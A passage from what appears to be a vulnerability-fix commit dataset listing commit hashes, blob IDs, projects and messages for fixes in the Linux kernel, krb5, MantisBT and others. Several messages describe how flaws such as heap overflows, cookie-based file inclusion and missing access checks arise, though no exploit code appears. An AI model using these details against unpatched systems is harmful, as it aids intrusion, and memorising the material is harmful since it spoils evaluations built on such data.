sysenter_exit+0xf/0x16    [<c104dc1e>] ? trace_hardirqs_on_caller+0x10e/0x13f    [<c129370c>] sysenter_do_call+0x12/0x32   Code: 83 c4 0c 5b 5e 5f c9 c3 55 b9 04 00 00 00 89 e5 57 8d 7d e4 56 53 8d 5d e4 83 ec 18 89 45 e0 89 55 dc 0f b6 70 0f c1 e6 04 01 d6 <f3> a5 be 0f 00 00 00 4e 89 d8 e8 48 ff ff ff 8b 45 e0 89 da 0f   EIP: [<d88c92d4>] gf128mul_4k_lle+0x23/0x60 [gf128mul] SS:ESP 0068:d6b8dda4   CR2: 0000000000000670   ---[ end trace 4eaa2a86a8e2da24 ]---   note: hashatron[1502] exited with preempt_count 1   BUG: scheduling while atomic: hashatron/1502/0x10000002   INFO: lockdep is turned off.   [...]\n\nSigned-off-by: Nick Bowler <nbowler@elliptictech.com> Cc: stable@kernel.org [2.6.37+] Signed-off-by: Herbert Xu <herbert@gondor.apana.org.au>

======================================================================
Commit With Fix: 
    15291164b22a357cb211b618adfef4fa82fc0de3
File(s) In Commit: 
    fs/jbd2/transaction.c
Blob(s) In Commit: 
    5265330625484b7475d3073e2d358ec2cefaf71a
Blob(s) Before Fix: 
    2d7109414cdd6b7a4d21bdb2e738ff20581523a4
    35ae096bed5dca819181c1d7bfa94194fa3b0c01
    8267de588982cb68dc1698ee5a3fc51bfdaa3ef0
    a0e41a4c080e9b2d3a51f5b4c6404cb8b8bc9c2b
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for 15291164b22a357cb211b618adfef4fa82fc0de3:
jbd2: clear BH_Delay & BH_Unwritten in journal_unmap_buffer\n\njournal_unmap_buffer()'s zap_buffer: code clears a lot of buffer head state ala discard_buffer(), but does not touch _Delay or _Unwritten as discard_buffer() does.\n\nThis can be problematic in some areas of the ext4 code which assume that if they have found a buffer marked unwritten or delay, then it's a live one.  Perhaps those spots should check whether it is mapped as well, but if jbd2 is going to tear down a buffer, let's really tear it down completely.\n\nWithout this I get some fsx failures on sub-page-block filesystems up until v3.2, at which point 4e96b2dbbf1d7e81f22047a50f862555a6cb87cb and 189e868fa8fdca702eb9db9d8afc46b5cb9144c9 make the failures go away, because buried within that large change is some more flag clearing.  I still think it's worth doing in jbd2, since ->invalidatepage leads here directly, and it's the right place to clear away these flags.\n\nSigned-off-by: Eric Sandeen <sandeen@redhat.com> Signed-off-by: "Theodore Ts'o" <tytso@mit.edu> Cc: stable@vger.kernel.org

======================================================================
Commit With Fix: 
    f8e9881c2aef1e982e5abc25c046820cd0b7cf64
File(s) In Commit: 
    net/bridge/br_netfilter.c
Blob(s) In Commit: 
    f3bc322c589128d14d6367368597f6da66958bcb
Blob(s) Before Fix: 
    008ff6c4eecf3da16c55901afd9e9fbde9f5ee2f
    137f23259a93947ce581a9d14c8f6048f3ca2c19
    268e2e7258881addf26214bb4418382ba3228c97
    44420992f72f17cc61f9e854ff511c8ec2bb270b
    4b5b66d07bba7d43a521d2f450386ceea1bf2ca9
    4c4977d12fd64d81a0c0281cd166346b81e65da1
    865fd7634b673d4233c8a6758e2426db55696514
    a16a2342f6bf2ee0b6a30329736c91acaff19bb9
    f97af5590ba12c01c9937558469e60ca68dc3864
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for f8e9881c2aef1e982e5abc25c046820cd0b7cf64:
bridge: reset IPCB in br_parse_ip_options\n\nCommit 462fb2af9788a82 (bridge : Sanitize skb before it enters the IP stack), missed one IPCB init before calling ip_options_compile()\n\nThanks to Scot Doyle for his tests and bug reports.\n\nReported-by: Scot Doyle <lkml@scotdoyle.com> Signed-off-by: Eric Dumazet <eric.dumazet@gmail.com> Cc: Hiroaki SHIMODA <shimoda.hiroaki@gmail.com> Acked-by: Bandan Das <bandan.das@stratus.com> Acked-by: Stephen Hemminger <shemminger@vyatta.com> Cc: Jan Lübbe <jluebbe@debian.org> Signed-off-by: David S. Miller <davem@davemloft.net>

======================================================================
Commit With Fix: 
    56c6a8a4aadca809e04276eabe5552935c51387f
File(s) In Commit: 
    mm/oom_kill.c
Blob(s) In Commit: 
    e9a17857a203d24dd1d90d6d6f6cabd39566efab
Blob(s) Before Fix: 
    0192ab36284b399a2b1f77ba71af555444779c45
    237050478f28f46fc59c5c9984337f1c3d60de08
    38103329604417174003c126c5d892e5c8e7c494
    4029583a10241aaa84e3937ee216740e0a88a363
    5299cb8756ff9408db65a9362fd6622415786aa5
    55c7efda9e8b1d57da0f2ea5027beb40be60e72e
    626303b52f3ce0764d3bb1029f6bce8b5bcaa896
    756071f70e0b6e76938e5fa150579728ea6a3279
    7c72487ca459495026387de3c0c0c0302a44dec7
    a7b2460e922b779252ebcc225cecaf6060b0e964
    aac23ee73e9863a3445470cb8eca441eb97b6cbf
    bae8f1e4c5fe376e9fdfd2aae41dbb307368f875
    bdb996c2eb125b86cc22d8a3ad30b04af4195450
Projects:
    0-T-0_ps4-linux
Commit Message for 56c6a8a4aadca809e04276eabe5552935c51387f:
oom: fix integer overflow of points in oom_badness\n\ncommit ff05b6f7ae762b6eb464183eec994b28ea09f6dd upstream.\n\nAn integer overflow will happen on 64bit archs if task's sum of rss, swapents and nr_ptes exceeds (2^31)/1000 value.  This was introduced by commit\n\nf755a04 oom: use pte pages in OOM score\n\nwhere the oom score computation was divided into several steps and it's no longer computed as one expression in unsigned long(rss, swapents, nr_pte are unsigned long), where the result value assigned to points(int) is in range(1..1000).  So there could be an int overflow while computing\n\n176          points *= 1000 \n\nand points may have negative value. Meaning the oom score for a mem hog task will be one.\n\n196          if (points <= 0) 197                  return 1 \n\nFor example: [ 3366]     0  3366 35390480 24303939   5       0             0 oom01 Out of memory: Kill process 3366 (oom01) score 1 or sacrifice child\n\nHere the oom1 process consumes more than 24303939(rss)*4096~=92GB physical memory, but it's oom score is one.\n\nIn this situation the mem hog task is skipped and oom killer kills another and most probably innocent task with oom score greater than one.\n\nThe points variable should be of type long instead of int to prevent the int overflow.\n\nSigned-off-by: Frantisek Hrbata <fhrbata@redhat.com> Acked-by: KOSAKI Motohiro <kosaki.motohiro@jp.fujitsu.com> Acked-by: Oleg Nesterov <oleg@redhat.com> Acked-by: David Rientjes <rientjes@google.com> Signed-off-by: Andrew Morton <akpm@linux-foundation.org> Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org> Signed-off-by: Greg Kroah-Hartman <gregkh@suse.de>\n\n

======================================================================
Commit With Fix: 
    e8af315211b07c8f48f32a063233cc3f76dd5bc2
File(s) In Commit: 
    tastypie/serializers.py
Blob(s) In Commit: 
    5ff95d4a52cf39dd8ca60a49dc0578f3b09d576b
Blob(s) Before Fix: 
    3448c464396282083a53bb811388690ecbe7313c
    fbfa80d50230ebd85b23c21ff8e0dfc2dd8d7ea7
Projects:
    00stefan00_django-tastypie
Commit Message for e8af315211b07c8f48f32a063233cc3f76dd5bc2:
Safer loading of YAML. Thanks to daveyss for the report!

======================================================================
Commit With Fix: 
    a9cf73ea7ff78f52662c8658d93c226effbbedde
File(s) In Commit: 
    net/ipv6/udp.c
Blob(s) In Commit: 
    9e305d74b3d41a99a065da67fe54bd3a4a9ebaa6
Blob(s) Before Fix: 
    103ab5d599237d856aaf8fd74fcf598827ed24ca
    15c37746845ed1ad678866756b4057421b7f3f0a
    41f8c9c08dbaf86051a16c5488b6c961f65278fc
    5acb3560ff15267021266f59c7b2102f633f3d6a
    6703f8b949267da6f88db793ec90043ce0a020a4
    69ebdbe78c47cb1e24657d21710b7f4b81af8ea7
    90824852f598d34f4c544392e247a6f93a7bd0b0
    91def93bec85060e7571218c20439cabd4ec824f
    9a009c66c8a3dd549262aeeb392bf68ec60c5fd4
    cd6cb7c3e5636e5911a36b5e1b4ebb4cb96b4be4
    d7037c006e1321923d654bbb2b45f457994662cd
    ef2adf1885088d6e335fb7592d4e99f64410b917
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for a9cf73ea7ff78f52662c8658d93c226effbbedde:
ipv6: udp: fix the wrong headroom check\n\nAt this point, skb->data points to skb_transport_header. So, headroom check is wrong.\n\nFor some case:bridge(UFO is on) + eth device(UFO is off), there is no enough headroom for IPv6 frag head. But headroom check is always false.\n\nThis will bring about data be moved to there prior to skb->head, when adding IPv6 frag header to skb.\n\nSigned-off-by: Shan Wei <shanwei@cn.fujitsu.com> Acked-by: Herbert Xu <herbert@gondor.apana.org.au> Signed-off-by: David S. Miller <davem@davemloft.net>

======================================================================
Commit With Fix: 
    ae53b5bd77719fed58086c5be60ce4f22bffe1c6
File(s) In Commit: 
    net/sctp/input.c
Blob(s) In Commit: 
    2e4a8646dbc389dcb55fcce1cf6b3ad0f608af0d
Blob(s) Before Fix: 
    87577436d7fb00d17ba58f863c897239720ab40b
    91ae463b079b13bf62c89fa7d8e7529e7af85685
    a49fa80b57b96ff2047d53d13c3a8ad134ecffbe
    be736afee899934ba7d3535302eac9cc60725ae5
    bf612d954d413fd46ccc489202f8014b5b2ae556
    ca6b022b1df247f93d058b5cdee5c5430f52e286
    d2e98803ffe30a5ffba004562ea23c00f59ff1c9
    d57ff7f3c5764510e32c8b1812c2c89492df9da8
    ea2192444ce66413261d20ce8ec236279496d141
Projects:
    0-T-0_ps4-linux
    007shadowfighter_rails
    0day-ci_xen
Commit Message for ae53b5bd77719fed58086c5be60ce4f22bffe1c6:
sctp: Fix another socket race during accept/peeloff\n\nThere is a race between sctp_rcv() and sctp_accept() where we have moved the association from the listening socket to the accepted socket, but sctp_rcv() processing cached the old socket and continues to use it.\n\nThe easy solution is to check for the socket mismatch once we've grabed the socket lock.  If we hit a mis-match, that means that were are currently holding the lock on the listening socket, but the association is refrencing a newly accepted socket.  We need to drop the lock on the old socket and grab the lock on the new one.\n\nA more proper solution might be to create accepted sockets when the new association is established, similar to TCP.  That would eliminate the race for 1-to-1 style sockets, but it would still existing for 1-to-many sockets where a user wished to peeloff an association.  For now, we'll live with this easy solution as it addresses the problem.\n\nReported-by: Michal Hocko <mhocko@suse.cz> Reported-by: Karsten Keil <kkeil@suse.de> Signed-off-by: Vlad Yasevich <vladislav.yasevich@hp.com> Signed-off-by: David S. Miller <davem@davemloft.net>

======================================================================
Commit With Fix: 
    bc909d9ddbf7778371e36a651d6e4194b1cc7d4c
File(s) In Commit: 
    net/socket.c
Blob(s) In Commit: 
    ffe92ca32f2acc031605e69d13614b6c8374bed3
Blob(s) Before Fix: 
    02dc82db3d232c79173d271370f7ff2bd68f5dc7
    166ad32f94484beff184b1e6347934894d0be798
    1ad42d3604e45e3eb1965f097eb2250c0b2ffd0f
    1b0f0fccdbcd0c37cb9d5565c3d4bed527a8a522
    1db33a99594cecd71f865821afe2ac8426d30916
    24a77400b65e4e8fd63f825144bdc4891b5fced9
    2877647f347b06e75aaaa7fd355799a43cd65bf3
    310d16b1b3c9cbbb1d401f19f24c6a61d0df4404
    3b5e6bb13b6105dba59c10cb19fe490d87eebb32
    3ff8a228ddf4b19a3fe347fb6dcfac829403fae7
    75655365b5fd2041d9bdf97d936275b1f74b217e
    769c386bd4288758635acde6ca77c401a49c61a8
    791d71a36a93dfec5166fe05e2e0cb394cfa904b
    8c5193e9dc82b627104cbdd9895f41f947255657
    a83b497ae73508279ce671bf34b3ee5ab8a24e00
    abf56b2a14f9bc0a9f7c83fbcabaa2e97b3eca37
    b1cbbcd9255854a7d52571688160bf3d87baf483
    e0ccf131f9e6148da9fc4d4a71656f2344137e1f
    e4c7f90fca1b44a133db08063bfa1bacdd2f69d8
    e763abec07e6b44204f402775bb02277d9d9ef8a
    fb10337b7ae98c3f17772cb1b53f9881f5a82ba3
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for bc909d9ddbf7778371e36a651d6e4194b1cc7d4c:
sendmmsg/sendmsg: fix unsafe user pointer access\n\nDereferencing a user pointer directly from kernel-space without going through the copy_from_user family of functions is a bad idea. Two of such usages can be found in the sendmsg code path called from sendmmsg, added by\n\ncommit c71d8ebe7a4496fb7231151cb70a6baa0cb56f9a upstream. commit 5b47b8038f183b44d2d8ff1c7d11a5c1be706b34 in the 3.0-stable tree.\n\nUsages are performed through memcmp() and memcpy() directly. Fix those by using the already copied msg_sys structure instead of the __user *msg structure. Note that msg_sys can be set to NULL by verify_compat_iovec() or verify_iovec(), which requires additional NULL pointer checks.\n\nSigned-off-by: Mathieu Desnoyers <mathieu.desnoyers@efficios.com> Signed-off-by: David Goulet <dgoulet@ev0ke.net> CC: Tetsuo Handa <penguin-kernel@I-love.SAKURA.ne.jp> CC: Anton Blanchard <anton@samba.org> CC: David S. Miller <davem@davemloft.net> CC: stable <stable@kernel.org> Signed-off-by: David S. Miller <davem@davemloft.net>

======================================================================
Commit With Fix: 
    b5a1eeef04cc7859f34dec9b72ea1b28e4aba07c
File(s) In Commit: 
    net/batman-adv/icmp_socket.c
Blob(s) In Commit: 
    d9c1e7bb7fbfa4ba6d5d579bfe1b266cbab65052
Blob(s) Before Fix: 
    0c82ce3b80f54c236c7ccc2a40c3b0b0671c17e9
    130cc3217e2b0fb091dccfad6a4f41d4b0c9dbc9
    34ce56c358e5ee750f13395eee1f395d0029979d
    3b04fff3ede387c54ab382a0c563f1b1b8656d03
    ac3520e057c0079d97943433a8df648ac1cc402c
    fa22ba2bb832ac97b58b4b35c36830fceb7e75ee
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for b5a1eeef04cc7859f34dec9b72ea1b28e4aba07c:
batman-adv: Only write requested number of byte to user buffer\n\nDon't write more than the requested number of bytes of an batman-adv icmp packet to the userspace buffer. Otherwise unrelated userspace memory might get overridden by the kernel.\n\nSigned-off-by: Sven Eckelmann <sven@narfation.org> Signed-off-by: Marek Lindner <lindner_marek@yahoo.de>

======================================================================
Commit With Fix: 
    8ea6f7bc37d05a9ec25b5afbea011cf9de5f1e49
File(s) In Commit: 
    C4/Output.pm
Blob(s) In Commit: 
    155c5c4cad12f07c6325e35a230481c4d11113a3
Blob(s) Before Fix: 
    e72c5e13af6e21d4beeffc0ca5c30b2c2fb62c42
Projects:
    24455287_Koha
Commit Message for 8ea6f7bc37d05a9ec25b5afbea011cf9de5f1e49:
[#21464023] Security: arbitrary file inclusion\n\nPoor input cleansing can allow a well-constructed cookie to return the contents of arbitrary file system objects.

======================================================================
Commit With Fix: 
    be20250c13f88375345ad99950190685eda51eb8
File(s) In Commit: 
    net/rose/rose_subr.c
Blob(s) In Commit: 
    174d51c9ce37774f1a046ff49f0157d265e1a5bb
Blob(s) Before Fix: 
    1734abba26a29bf1a9d156747b97d0d8c5f1fe84
    f6c71caa94b9d8b7fe2d7873264929218af2a97c
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for be20250c13f88375345ad99950190685eda51eb8:
ROSE: prevent heap corruption with bad facilities\n\nWhen parsing the FAC_NATIONAL_DIGIS facilities field, it's possible for a remote host to provide more digipeaters than expected, resulting in heap corruption.  Check against ROSE_MAX_DIGIS to prevent overflows, and abort facilities parsing on failure.\n\nAdditionally, when parsing the FAC_CCITT_DEST_NSAP and FAC_CCITT_SRC_NSAP facilities fields, a remote host can provide a length of less than 10, resulting in an underflow in a memcpy size, causing a kernel panic due to massive heap corruption.  A length of greater than 20 results in a stack overflow of the callsign array.  Abort facilities parsing on these invalid length values.\n\nSigned-off-by: Dan Rosenberg <drosenberg@vsecurity.com> Cc: stable@kernel.org Signed-off-by: David S. Miller <davem@davemloft.net>

======================================================================
Commit With Fix: 
    1b1ec5ce75e224bd1755650c18ccdaa6dc53e605
File(s) In Commit: 
    src/modules/rlm_unix/rlm_unix.c
Blob(s) In Commit: 
    abec68c9d9d0318164a7d5c175f359f25f3c6685
Blob(s) Before Fix: 
    5c0fe0fc327178fd6c767b78812140e56fbe33da
    bf4ddb4c4cbaf7a8d650028a100519098b64c09b
Projects:
    0xbad0c0d3_freeradius-server
Commit Message for 1b1ec5ce75e224bd1755650c18ccdaa6dc53e605:
heck for account and password expiration

======================================================================
Commit With Fix: 
    59f81ea6bd8ef96c04a706a3ca453cd656284faa
File(s) In Commit: 
    Kwf/Exception/Abstract.php
Blob(s) In Commit: 
    6da4ece7261faa28c2c9a587d2055febbe04f9ef
Blob(s) Before Fix: 
    d447cf583efbc5a777568d5d53f7127cff7151d5
Projects:
    Ben-Ho_koala-framework
Commit Message for 59f81ea6bd8ef96c04a706a3ca453cd656284faa:
fix XSS security issue: escape request_uri in 404 pages

======================================================================
Commit With Fix: 
    33f0e9c58bbf047e1b401a834f3abfe72d9a8947
File(s) In Commit: 
    chef-server-api/app/controllers/clients.rb
Blob(s) In Commit: 
    efa2b4a3d448cc2df6817c8c2d6ca4199fbcff40
Blob(s) Before Fix: 
    6da5515df2e6991fb7d691b5ad1a9a8800f8bb72
    81ca0c9baa3ae4f99b0232a7852955b60f6f806d
Projects:
    17601606252_chef
Commit Message for 33f0e9c58bbf047e1b401a834f3abfe72d9a8947:
CHEF-2649: Only allow admin clients to create admins (not validators)

======================================================================
Commit With Fix: 
    c290f8358acaeffd8e0c551ddcc24d1206143376
File(s) In Commit: 
    drivers/tty/tty_io.c
Blob(s) In Commit: 
    6913da8f202cd7fc4f82c33ead60c462dcf9e3a5
Blob(s) Before Fix: 
    4ca4bcd28ff74081d6a882c2f18b9a3995af3474
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for c290f8358acaeffd8e0c551ddcc24d1206143376:
TTY: drop driver reference in tty_open fail path\n\nWhen tty_driver_lookup_tty fails in tty_open, we forget to drop a reference to the tty driver. This was added by commit 4a2b5fddd5 (Move tty lookup/reopen to caller).\n\nFix that by adding tty_driver_kref_put to the fail path.\n\nI will refactor the code later. This is for the ease of backporting to stable.\n\nIntroduced-in: v2.6.28-rc2 Signed-off-by: Jiri Slaby <jslaby@suse.cz> Cc: stable <stable@vger.kernel.org> Cc: Alan Cox <alan@lxorguk.ukuu.org.uk> Acked-by: Sukadev Bhattiprolu <sukadev@linux.vnet.ibm.com> Signed-off-by: Greg Kroah-Hartman <gregkh@suse.de>

======================================================================
Commit With Fix: 
    11508aa72efab4fad0dbd8292b9614d9371b20a9
File(s) In Commit: 
    modules/bouncedcc.cpp
Blob(s) In Commit: 
    d06ecf0e92c97c7ae5148b560ae7e2791db2b480
Blob(s) Before Fix: 
    283e5a68599fe8395000a5412d89b866facc93cf
    b520ffd6d7cc0ce590dc89c324121b99e9441afb
    c91ca37bd483a04e2a3f048ff19ec3a6cf4f629f
Projects:
    126carpower_znc
Commit Message for 11508aa72efab4fad0dbd8292b9614d9371b20a9:
Fix crash in bouncedcc module.\n\nIt happens when DCC RESUME is received. Affected ZNC versions: 0.200, 0.202.\n\nThanks to howeyc for reporting this and providing the patch.

======================================================================
Commit With Fix: 
    802f43594d6e4d2ac61086d239153c17873a0428
File(s) In Commit: 
    fs/aio.c
Blob(s) In Commit: 
    969beb0e22311a4f7e7f4155524709d5dd8269bf
Blob(s) Before Fix: 
    1bdbe196a7b2ccfe35fd2aebbfeaf68328e430fd
    1cf12b3dd83a0654d7c0629786d8ab7fd4388a23
    632b235f4fbe02c237de17fbde271c8bfe6f1240
    78c514cfd212d66b8e6311d4a25435be6493c26d
    7f54f43b8f7c9557d652e741ecdc544b207b73d3
    8c8f6c5b6d7930657f7a3aadf44fe4b4dc96b738
    a564a9d2727b272a9e4a7cbce98150d17a5c6cf6
    e29ec485af255822b8414be128fc8ef66da9a204
Projects:
    0-T-0_ps4-linux
Commit Message for 802f43594d6e4d2ac61086d239153c17873a0428:
Unused iocbs in a batch should not be accounted as active.\n\ncommit 69e4747ee9727d660b88d7e1efe0f4afcb35db1b upstream.\n\nSince commit 080d676de095 ("aio: allocate kiocbs in batches") iocbs are allocated in a batch during processing of first iocbs.  All iocbs in a batch are automatically added to ctx->active_reqs list and accounted in ctx->reqs_active.\n\nIf one (not the last one) of iocbs submitted by an user fails, further iocbs are not processed, but they are still present in ctx->active_reqs and accounted in ctx->reqs_active.  This causes process to stuck in a D state in wait_for_all_aios() on exit since ctx->reqs_active will never go down to zero.  Furthermore since kiocb_batch_free() frees iocb without removing it from active_reqs list the list become corrupted which may cause oops.\n\nFix this by removing iocb from ctx->active_reqs and updating ctx->reqs_active in kiocb_batch_free().\n\nSigned-off-by: Gleb Natapov <gleb@redhat.com> Reviewed-by: Jeff Moyer <jmoyer@redhat.com> Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org> Signed-off-by: Greg Kroah-Hartman <gregkh@suse.de>\n\n

======================================================================
Commit With Fix: 
    2702b1526c7278c4d65d78de209a465d4de2885e
File(s) In Commit: 
    kernel/sys.c
Blob(s) In Commit: 
    01865c6fb6a0c4739a18a5f4b746a5b8da038680
Blob(s) Before Fix: 
    c5cb5b99cb8152808f569f6b993010a33e646bce
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for 2702b1526c7278c4d65d78de209a465d4de2885e:
kernel/sys.c: fix stack memory content leak via UNAME26\n\nCalling uname() with the UNAME26 personality set allows a leak of kernel stack contents.  This fixes it by defensively calculating the length of copy_to_user() call, making the len argument unsigned, and initializing the stack buffer to zero (now technically unneeded, but hey, overkill).\n\nCVE-2012-0957\n\nReported-by: PaX Team <pageexec@freemail.hu> Signed-off-by: Kees Cook <keescook@chromium.org> Cc: Andi Kleen <ak@linux.intel.com> Cc: PaX Team <pageexec@freemail.hu> Cc: Brad Spengler <spender@grsecurity.net> Cc: <stable@vger.kernel.org> Signed-off-by: Andrew Morton <akpm@linux-foundation.org> Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>

======================================================================
Commit With Fix: 
    c5be6209311d4a8f10fda37d0d3f876c1b33b77b
File(s) In Commit: 
    src/lib/kadm5/srv/svr_principal.c
Blob(s) In Commit: 
    f5ea005b2738d58afb89b2015747dfafdabc882c
Blob(s) Before Fix: 
    a0b110def012d343d536ad59ded21219348e7c08
Projects:
    3van_krb5
Commit Message for c5be6209311d4a8f10fda37d0d3f876c1b33b77b:
Null pointer deref in kadmind [CVE-2012-1013]\n\nThe fix for #6626 could cause kadmind to dereference a null pointer if a create-principal request contains no password but does contain the KRB5_KDB_DISALLOW_ALL_TIX flag (e.g. "addprinc -randkey -allow_tix name").  Only clients authorized to create principals can trigger the bug.  Fix the bug by testing for a null password in check_1_6_dummy.\n\nCVSSv2 vector: AV:N/AC:M/Au:S/C:N/I:N/A:P/E:H/RL:O/RC:C\n\n[ghudson@mit.edu: Minor style change and commit message]\n\nticket: 7152 target_version: 1.10.2 tags: pullup

======================================================================
Commit With Fix: 
    db64ca25d661a47b996b4e2645998b5d7f0eb52c
File(s) In Commit: 
    src/plugins/preauth/pkinit/pkinit_srv.c
Blob(s) In Commit: 
    c271bf98148c1323398cab32c581a7a27ad5fa81
Blob(s) Before Fix: 
    3322310bf5ad9b5d9801e668de3abbf8cfd1f1ce
Projects:
    3van_krb5
Commit Message for db64ca25d661a47b996b4e2645998b5d7f0eb52c:
PKINIT (draft9) null ptr deref [CVE-2012-1016]\n\nDon't check for an agility KDF identifier in the non-draft9 reply structure when we're building a draft9 reply, because it'll be NULL.\n\nThe KDC plugin for PKINIT can dereference a null pointer when handling a draft9 request, leading to a crash of the KDC process.  An attacker would need to have a valid PKINIT certificate, or an unauthenticated attacker could execute the attack if anonymous PKINIT is enabled.\n\nCVSSv2 vector: AV:N/AC:M/Au:N/C:N/I:N/A:P/E:P/RL:O/RC:C\n\n[tlyu@mit.edu: reformat comment and edit log message]\n\n(back ported from commit cd5ff932c9d1439c961b0cf9ccff979356686aff)\n\nticket: 7527 (new) version_fixed: 1.10.4 status: resolved

======================================================================
Commit With Fix: 
    88d7d4e4a439f32acc56a6d860e415ee71d3df08
File(s) In Commit: 
    fs/cifs/dir.c
Blob(s) In Commit: 
    bf68b4fc9512f0ad226f9503dffbc50d8818138c
Blob(s) Before Fix: 
    d7eeb9d3ed6feae9a8c25f9e71d7822efba3e488
    e4c33345113779bfbf832b42cd3a36775ab0d1ee
Projects:
    0-T-0_ps4-linux
Commit Message for 88d7d4e4a439f32acc56a6d860e415ee71d3df08:
cifs: fix dentry refcount leak when opening a FIFO on lookup\n\ncommit 5bccda0ebc7c0331b81ac47d39e4b920b198b2cd upstream.\n\nThe cifs code will attempt to open files on lookup under certain circumstances. What happens though if we find that the file we opened was actually a FIFO or other special file?\n\nCurrently, the open filehandle just ends up being leaked leading to a dentry refcount mismatch and oops on umount. Fix this by having the code close the filehandle on the server if it turns out not to be a regular file. While we're at it, change this spaghetti if statement into a switch too.\n\nReported-by: CAI Qian <caiqian@redhat.com> Tested-by: CAI Qian <caiqian@redhat.com> Reviewed-by: Shirish Pargaonkar <shirishpargaonkar@gmail.com> Signed-off-by: Jeff Layton <jlayton@redhat.com> Signed-off-by: Steve French <smfrench@gmail.com> Signed-off-by: Greg Kroah-Hartman <gregkh@linuxfoundation.org>\n\n

======================================================================
Commit With Fix: 
    77d61c6eca4d08b9b025738acf6b926cc750db23
File(s) In Commit: 
    taglib/ape/apeproperties.cpp
Blob(s) In Commit: 
    4f14d6c5eca4ee38afa146fa897e8af19e48485a
Blob(s) Before Fix: 
    7f9cdb5af576635d8d72f50a9c7dd8626e928397
    aab9d25cf44ce61aaf50d3772ec8bad39227085a
Projects:
    121340129_taglib
Commit Message for 77d61c6eca4d08b9b025738acf6b926cc750db23:
Make sure to not try dividing by zero

======================================================================
Commit With Fix: 
    b3646a07348ffa276ea41a9dae03ddc63ea6c532
File(s) In Commit: 
    taglib/ogg/xiphcomment.cpp
Blob(s) In Commit: 
    e7e8fa915a8ede594548012dd6de92bddbc29ab5
Blob(s) Before Fix: 
    344d9cfcad7d35156c20a823bcca34e083b74da0
Projects:
    121340129_taglib
Commit Message for b3646a07348ffa276ea41a9dae03ddc63ea6c532:
Be more careful when parsing Vorbis Comments

======================================================================
Commit With Fix: 
    eb803ed02105fc919cf5f789e939f2b824162927
File(s) In Commit: 
    core/access_api.php
Blob(s) In Commit: 
    c05ad005fb3df7b419e61e96d7ceb43ba9ae2d7b
Blob(s) Before Fix: 
    a94b291fde42b0dcfc72ab57e389818f645f4693
Projects:
    01-Scripts_mantisbt
Commit Message for eb803ed02105fc919cf5f789e939f2b824162927:
Fix bug in access_has_bug_level() for private issues\n\nWhen private_bug_threshold is defined as an array instead of a single access level, e.g. array(0=>40, 1=>70, 2=>90) to prevent developers from seeing private bugs while granting that privilege to updaters, access_has_bug_level() incorrectly returned true.\n\nThe consequence is that unwanted access to Private bugs was granted to users who are allowed to view them, e.g. allowing them to delete or perform other restricted actions.\n\nFixes #10124

======================================================================
Commit With Fix: 
    df7782a65e96aa1c9639a7625a658102134c7fe0
File(s) In Commit: 
    api/soap/mc_issue_api.php
Blob(s) In Commit: 
    cf823da63dcf261ae96d1852d2ccdb0fd4d39790
Blob(s) Before Fix: 
    cd41fe9003abc55dbf6157eb435aa3221467deda
Projects:
    01-Scripts_mantisbt
Commit Message for df7782a65e96aa1c9639a7625a658102134c7fe0:
SOAP API: proper access checks when deleting bugs\n\nAffects #13656 : Reporters have read/write access to existing data of other users

======================================================================
Commit With Fix: 
    0da3f7ace233208eb3c8d628cc2fd6e56d83839f
File(s) In Commit: 
    bug_actiongroup.php
Blob(s) In Commit: 
    c68a07fb1277e0688ca7bc8aeae0d9dcc5d3b995
Blob(s) Before Fix: 
    7a4b89ad354a7903230dff6551e4fbf44742bec0
Projects:
    01-Scripts_mantisbt
Commit Message for 0da3f7ace233208eb3c8d628cc2fd6e56d83839f:
Fix Move bugs from projects with access < report_bug_threshold\n\nThe access check in bug_actiongroup.php was not correct. It should verify the user's report_bug_threshold in the target project, not the current project.\n\nFixes #13748

======================================================================
Commit With Fix: 
    f5106be52cf6aa72c521f388e4abb5f0de1f1d7f
File(s) In Commit: 
    api/soap/mc_api.php
Blob(s) In Commit: 
    a81781ae1bd40694f4fe2065726a470b87be4ff7
Blob(s) Before Fix: 
    507680f490705d888fc0d619b8ee91ac9399d0eb
    afb6f410b1d4da8f501793d7324b09b3e7bc9c4a
Projects:
    01-Scripts_mantisbt
Commit Message for f5106be52cf6aa72c521f388e4abb5f0de1f1d7f:
Fix 0013901: SOAP API allows invoking methods without proper authentication\n\nNote: only applied to 1.2.x not 'next', as the code is changing anyway

======================================================================
Commit With Fix: 
    371528caec553785c37f73fa3926ea0de84f986f
File(s) In Commit: 
    mm/memcontrol.c
Blob(s) In Commit: 
    228d6461c12ade8941b37416ca867d3df3277acd
Blob(s) Before Fix: 
    20a8193a7af8ed275667e682fd22101a0e40bb93
    3508777837c70824a946e931f7cf7fa7b1424399
    3dbff4dcde35191a62b0245ac7ee185bc8fc7084
    488b644e0e8ef8f55ddc877b5359567b9cb82874
    556859fec4ef45fe87bd4060612501354ed48c9a
    6728a7ae6f2d1eb42c8ac183ec69098aa80d2d6c
    6aff93c98acaf6020eabd37f2e9b49a04135f187
    b63f5f7dfa071225487ebf5baa365f5b3baebe3b
    da53a252b259f0f36f553e9646187db18d49d76a
    e013b8e57d25cd198c410743adcadb8446176e75
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for 371528caec553785c37f73fa3926ea0de84f986f:
mm: memcg: Correct unregistring of events attached to the same eventfd\n\nThere is an issue when memcg unregisters events that were attached to the same eventfd:\n\n- On the first call mem_cgroup_usage_unregister_event() removes all   events attached to a given eventfd, and if there were no events left,   thresholds->primary would become NULL \n\n- Since there were several events registered, cgroups core will call   mem_cgroup_usage_unregister_event() again, but now kernel will oops,   as the function doesn't expect that threshold->primary may be NULL.\n\nThat's a good question whether mem_cgroup_usage_unregister_event() should actually remove all events in one go, but nowadays it can't do any better as cftype->unregister_event callback doesn't pass any private event-associated cookie. So, let's fix the issue by simply checking for threshold->primary.\n\nFWIW, w/o the patch the following oops may be observed:\n\n BUG: unable to handle kernel NULL pointer dereference at 